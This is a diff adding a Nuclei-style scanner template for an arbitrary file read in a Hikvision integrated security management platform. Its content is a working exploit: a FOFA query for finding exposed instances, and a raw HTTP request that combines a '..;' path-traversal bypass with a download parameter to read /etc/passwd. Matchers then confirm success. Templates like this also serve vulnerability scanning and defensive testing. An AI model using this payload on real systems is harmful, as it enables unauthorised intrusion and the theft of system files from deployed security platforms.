@@ -1,0 +1,26 @@
+id: Hikvision-iSecure-Cente-download-readfile
+info:
+  name: 海康威视综合安防download任意文件读取
+  author: onewin
+  severity: high
+  description: 海康威视综合安防download任意文件读取
+  metadata:
+    fofa-query: title="综合安防管理平台"
+  tags: Hikvision,readfile,vuln
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
+        part: body
